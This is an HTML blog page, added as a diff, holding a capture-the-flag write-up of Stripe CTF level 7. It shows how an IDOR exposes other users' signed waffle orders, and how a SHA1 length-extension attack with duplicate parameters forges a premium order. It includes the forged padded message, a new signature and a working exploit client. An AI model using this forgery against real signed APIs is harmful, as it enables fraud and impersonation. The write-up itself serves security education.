@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <link href='//fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,700,400italic' rel='stylesheet' type='text/css'>
+  <link rel="stylesheet" type="text/css" href="../../../../../theme/css/style.min.css">
+  <link rel="stylesheet" type="text/css" href="../../../../../theme/css/pygments.min.css">
+  <link rel="stylesheet" type="text/css" href="../../../../../theme/css/font-awesome.min.css">
+  <link href="../../../../..//extras/style.css" rel="stylesheet">
+  <link href="https://allyourbase.utouch.fr/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="All Your Base Are Belong To Me Atom">
+  <link rel="shortcut icon" href="/extras/favicon.ico" type="image/x-icon">
+  <link rel="icon" href="/extras/favicon.ico" type="image/x-icon">
+
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="robots" content="" />
+<meta name="author" content="useless" />
+<meta name="description" content="You can find the code for this level here. (sha256: d497f25a620a2ad5e3850bf642cfc1df988e32b612d06f48fffa271912726e86) This level is the most delicious of all: you can order waffles online, and the company will have them delivered to the location you specified. There are seven types of waffle: veritaffle, belgian, brussels, eggo, chicken (premium), dream (premium ..." />
+<meta name="keywords" content="">
+<meta property="og:site_name" content="All Your Base Are Belong To Me"/>
+<meta property="og:title" content="Stripe CTF: Level #7"/>
+<meta property="og:description" content="You can find the code for this level here. (sha256: d497f25a620a2ad5e3850bf642cfc1df988e32b612d06f48fffa271912726e86) This level is the most delicious of all: you can order waffles online, and the company will have them delivered to the location you specified. There are seven types of waffle: veritaffle, belgian, brussels, eggo, chicken (premium), dream (premium ..."/>
+<meta property="og:locale" content="en_US"/>
+<meta property="og:url" content="../../../../../posts/2012/12/09/stripe-ctf-level-7/"/>
+<meta property="og:type" content="article"/>
+<meta property="article:published_time" content="2012-12-09 15:07:00+01:00"/>
+<meta property="article:modified_time" content=""/>
+<meta property="article:author" content="../../../../../author/useless.html">
+<meta property="article:section" content="Write-up"/>
+<meta property="og:image" content="/images/useless_profile_pic.jpg">  <title>All Your Base Are Belong To Me &ndash; Stripe CTF: Level #7</title>
+</head>
+<body>
+  <aside>
+    <div>
+      <a href="../../../../..">
+        <img src="/images/useless_profile_pic.jpg" alt="All Your Base Are Belong To Me" title="All Your Base Are Belong To Me">
+      </a>
+      <h1><a href="../../../../..">All Your Base Are Belong To Me</a></h1>
+      <p>You know, if that's alright with you</p>
+      <nav>
+        <ul class="list">
+        </ul>
+      </nav>
+      <ul class="social">
+        <li><a class="sc-envelope-o" href="mailto:yannick at meheut dot org" target="_blank"><i class="fa fa-envelope-o"></i></a></li>
+        <li><a class="sc-github" href="https://github.com/the-useless-one/" target="_blank"><i class="fa fa-github"></i></a></li>
+        <li><a class="sc-rss" href="https://allyourbase.utouch.fr/feeds/all.atom.xml" target="_blank"><i class="fa fa-rss"></i></a></li>
+      </ul>
+    </div>
+  </aside>
+  <main>
+    <nav>
+      <a href="../../../../..">Home</a>
+      <a href="/archives.html">Archives</a>
+      <a href="/categories.html">Categories</a>
+      <a href="https://allyourbase.utouch.fr/feeds/all.atom.xml">Atom</a>
+    </nav>
+
+<article>
+  <header>
+    <h1 id="stripe-ctf-level-7">Stripe CTF: Level #7</h1>
+    <p>Posted on dim. 09 décembre 2012 in <a href="../../../../../category/write-up.html">Write-up</a></p>
+  </header>
+  <div>
+    <img alt="level07-logo.jpg" class="align-center" src="/images/stripe-ctf-level-7/level07-logo.jpg" />
+<p>You can find the code for this level
+<a class="reference external" href="/docs/stripe-ctf-level-7/stripe-ctf-level07.tar.gz">here</a>.</p>
+<p>(sha256:
+<code>d497f25a620a2ad5e3850bf642cfc1df988e32b612d06f48fffa271912726e86</code>)</p>
+<p>This level is the most delicious of all: you can order waffles online,
+and the company will have them delivered to the location you specified.
+There are seven types of waffle: veritaffle, belgian, brussels, eggo,
+chicken (premium), dream (premium), and the king of waffles, liege
+(premium). You have an unprivileged account (login: ctf, password:
+password), so you can't order premium waffles. Yet, your goal is to
+order the supreme waffle: the liege. There are four other users on the
+website: larry (premium account), randall (premium account), alice and
+bob. Every user has an ID, and a secret (which has the form of a random
+string).</p>
+<img alt="level07-ctf-user-interface.png" class="align-center" src="/images/stripe-ctf-level-7/level07-ctf-user-interface.png" />
+<p>The company provides you with a client API you can use to order waffles.
+Every order is of the form:
+<code>count=XXX&amp;lat=XXX&amp;user_id=XXX&amp;long=XXX&amp;waffle=XXX</code>. Then, a
+signature is computed using the client's secret, and appended to the
+order. The signature is of the form:</p>
+<div class="highlight"><pre><span class="c"># File client.py, line 61</span>
+<span class="k">def</span> <span class="nf">_signature</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">message</span><span class="p">):</span>
+    <span class="n">h</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha1</span><span class="p">()</span>
+    <span class="n">h</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">api_secret</span> <span class="o">+</span> <span class="n">message</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">h</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span> <span class="c"># signature = SHA1(secret + message)</span>
+</pre></div>
+<p>We can view our past orders at the URL /logs/id.</p>
+<img alt="level07-ctf-order.png" class="align-center" src="/images/stripe-ctf-level-7/level07-ctf-order.png" />
+<p>But what if we change the ID in the URL?</p>
+<img alt="level07-larry-order.png" class="align-center" src="/images/stripe-ctf-level-7/level07-larry-order.png" />
+<img alt="level07-barry-order.png" class="align-center" src="/images/stripe-ctf-level-7/level07-barry-order.png" />
+<p>Bingo, we are now viewing larry's and randall's past orders. But since
+they didn't order any liege, we can't use these orders as is. Let's see
+in the code how the order is checked:</p>
+<div class="highlight"><pre><span class="c"># File wafflecopter.py, line 139</span>
+<span class="k">def</span> <span class="nf">parse_params</span><span class="p">(</span><span class="n">raw_params</span><span class="p">):</span>
+    <span class="n">pairs</span> <span class="o">=</span> <span class="n">raw_params</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&#39;&amp;&#39;</span><span class="p">)</span>
+    <span class="n">params</span> <span class="o">=</span> <span class="p">{}</span>
+    <span class="k">for</span> <span class="n">pair</span> <span class="ow">in</span> <span class="n">pairs</span><span class="p">:</span>
+        <span class="n">key</span><span class="p">,</span> <span class="n">val</span> <span class="o">=</span> <span class="n">pair</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&#39;=&#39;</span><span class="p">)</span>
+        <span class="n">key</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">unquote_plus</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+        <span class="n">val</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">unquote_plus</span><span class="p">(</span><span class="n">val</span><span class="p">)</span>
+        <span class="n">params</span><span class="p">[</span><span class="n">key</span><span class="p">]</span> <span class="o">=</span> <span class="n">val</span>
+    <span class="k">return</span> <span class="n">params</span>
+</pre></div>
+<p>That's the code which parse the body of the order. We can see that they
+don't check if a parameter has been specified more than once. So if you
+send an order of the form: <code>count=XXX&amp;lat=XXX&amp;user_id=XXX&amp;long=XXX&amp;waffle=XXX&amp;waffle=YYY</code>,
+the last waffle will be ordered (in this case, YYY).</p>
+<p>Great, so we can just take a previous order from larry, append
+<code>&amp;waffle=liege</code> to the end, and send it to the server!
+Actually, we can't, because of the signature: if we change the order,
+but not the signature, they won't match, and the server will refuse to
+carry our order. So we need to change the signature. But how can we do
+that without knowing larry's secret? The key here is cryptography.</p>
+<p>Like we said earlier, the signature is computed via <code>SHA1(secret +
+message)</code>. But the SHA1 function follows the <a class="reference external" href="https://en.wikipedia.org/wiki/Merkle%E2%80%93Damg%C3%A5rd_construction">Merkle–Damgård
+construction</a>.
+Basically, the message is broken up in equal blocks of 512 bits. Then,
+computation is done on the first block and produces an output. This
+output is used to perform the same computation on the second block, and
+so on. So, it means that given <code>SHA1(secret + message)</code> and the
+and the length of <code>secret</code>, we can compute <code>SHA1(secret + message +
+message_modifier)</code>. And that's exactly what we want, to append
+something (here, <code>&amp;waffle=liege</code>) at the end of the message.</p>
+<p>I started searching for a Python implementation of SHA1, and wanted to
+modify it so that it would compute my forged signature, but it took too
+much time. Fortunately, two guys I was working with on the CTF,
+<a class="reference external" href="https://twitter.com/_Lopi_">lopi</a> and mark, found a script that
+could forge the signature for us. The script was taken down since then,
+but you can find another working one <a class="reference external" href="https://gist.github.com/philfreo/3873715">here</a>.</p>
+<div class="highlight"><pre><span class="nv">$ </span>python sha-padding.py
+usage: sha-padding.py &lt;keylen&gt; &lt;original_message&gt; &lt;original_signature&gt;
+&lt;text_to_append&gt;
+<span class="nv">$ </span>python sha-padding.py 14
+<span class="s2">&quot;count=10&amp;lat=37.351&amp;user_id=1&amp;long=-119.827&amp;waffle=eggo&quot;</span>
+78943cff885d4b41ff058aa64a36520e66ffdbbe <span class="s2">&quot;&amp;waffle=liege&quot;</span>
+new msg:
+<span class="s1">&#39;count=10&amp;lat=37.351&amp;user_id=1&amp;long=-119.827&amp;waffle=eggo\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02(&amp;waffle=liege&#39;</span>
+base64:
+<span class="nv">Y291bnQ9MTAmbGF0PTM3LjM1MSZ1c2VyX2lkPTEmbG9uZz0tMTE5LjgyNyZ3YWZmbGU9ZWdnb4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIoJndhZmZsZT1saWVnZQ</span><span class="o">==</span>
+new sig: f7d4b492cc3282cd87e61624ee207ca496e807e4
+</pre></div>
+<p>Now, we just have to make the order:</p>
+<div class="highlight"><pre><span class="c"># File forged_client.py</span>
+<span class="kn">import</span> <span class="nn">pycurl</span><span class="o">,</span> <span class="nn">urllib</span><span class="o">,</span> <span class="nn">StringIO</span>
+
+<span class="k">def</span> <span class="nf">order</span><span class="p">():</span>
+    <span class="n">endpoint</span> <span class="o">=</span> <span class="s">&#39;http://localhost:9233&#39;</span>
+    <span class="n">body</span> <span class="o">=</span>
+        <span class="s">&#39;count=10&amp;lat=37.351&amp;user_id=1&amp;long=-119.827&amp;waffle=eggo</span><span class="se">\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02</span><span class="s">(&amp;waffle=liege&#39;</span>
+    <span class="n">signature</span> <span class="o">=</span> <span class="s">&#39;f7d4b492cc3282cd87e61624ee207ca496e807e4&#39;</span>
+    <span class="n">body</span> <span class="o">+=</span> <span class="s">&quot;|sig:&quot;</span> <span class="o">+</span> <span class="n">signature</span>
+
+    <span class="n">output</span> <span class="o">=</span> <span class="n">StringIO</span><span class="o">.</span><span class="n">StringIO</span><span class="p">()</span>
+    <span class="n">curl_object</span> <span class="o">=</span> <span class="n">pycurl</span><span class="o">.</span><span class="n">Curl</span><span class="p">()</span>
+    <span class="n">curl_object</span><span class="o">.</span><span class="n">setopt</span><span class="p">(</span><span class="n">pycurl</span><span class="o">.</span><span class="n">URL</span><span class="p">,</span> <span class="n">endpoint</span> <span class="o">+</span> <span class="s">&quot;/orders&quot;</span><span class="p">)</span>
+    <span class="n">curl_object</span><span class="o">.</span><span class="n">setopt</span><span class="p">(</span><span class="n">pycurl</span><span class="o">.</span><span class="n">POST</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+    <span class="n">curl_object</span><span class="o">.</span><span class="n">setopt</span><span class="p">(</span><span class="n">pycurl</span><span class="o">.</span><span class="n">POSTFIELDS</span><span class="p">,</span> <span class="n">body</span><span class="p">)</span>
+    <span class="n">curl_object</span><span class="o">.</span><span class="n">setopt</span><span class="p">(</span><span class="n">pycurl</span><span class="o">.</span><span class="n">WRITEFUNCTION</span><span class="p">,</span> <span class="n">output</span><span class="o">.</span><span class="n">write</span><span class="p">)</span>
+    <span class="n">curl_object</span><span class="o">.</span><span class="n">perform</span><span class="p">()</span>
+    <span class="n">curl_object</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+
+    <span class="n">resp</span> <span class="o">=</span> <span class="n">output</span><span class="o">.</span><span class="n">getvalue</span><span class="p">()</span>
+
+    <span class="k">return</span> <span class="n">resp</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="k">print</span> <span class="n">order</span><span class="p">()</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&quot;__main__&quot;</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+</pre></div>
+<div class="highlight"><pre><span class="nv">$ </span>python forged_client.py
+<span class="o">{</span><span class="s2">&quot;confirm_code&quot;</span>: <span class="s2">&quot;dummy-password&quot;</span>, <span class="s2">&quot;message&quot;</span>: <span class="s2">&quot;Great news: 10 liege</span>
+<span class="s2">waffles will soon be flying your way!&quot;</span>, <span class="s2">&quot;success&quot;</span>: <span class="nb">true</span><span class="o">}</span>
+</pre></div>
+<p>w00t!</p>
+
+  </div>
+  <div class="tag-cloud">
+    <p>
+    </p>
+  </div>
+</article>
+
+    <footer>
+<p>
+  &copy; Yannick Méheut 2016 - This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/">Creative Commons Attribution-ShareAlike 4.0 International License</a>
+</p>
+<p>Built using <a href="http://getpelican.com" target="_blank">Pelican</a> - <a href="https://github.com/alexandrevicenzi/flex" target="_blank">Flex</a> theme by <a href="http://alexandrevicenzi.com" target="_blank">Alexandre Vicenzi</a></p><p>
+  <a rel="license"
+     href="http://creativecommons.org/licenses/by-sa/4.0/"
+     target="_blank">
+    <img alt="Creative Commons License"
+         title="Creative Commons License"
+         style="border-width:0"
+         src="https://i.creativecommons.org/l/by-sa/4.0/80x15.png"
+         width="80"
+         height="15"/>
+  </a>
+</p>    </footer>
+  </main>
+<script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "BlogPosting",
+  "name": "Stripe CTF: Level #7",
+  "headline": "Stripe CTF: Level #7",
+  "datePublished": "2012-12-09 15:07:00+01:00",
+  "dateModified": "",
+  "author": {
+    "@type": "Person",
+    "name": "useless",
+    "url": "../../../../../author/useless.html"
+  },
+  "image": "/images/useless_profile_pic.jpg",
+  "url": "../../../../../posts/2012/12/09/stripe-ctf-level-7/",
+  "description": "You can find the code for this level here. (sha256: d497f25a620a2ad5e3850bf642cfc1df988e32b612d06f48fffa271912726e86) This level is the most delicious of all: you can order waffles online, and the company will have them delivered to the location you specified. There are seven types of waffle: veritaffle, belgian, brussels, eggo, chicken (premium), dream (premium ..."
+}
+</script></body>
+</html>
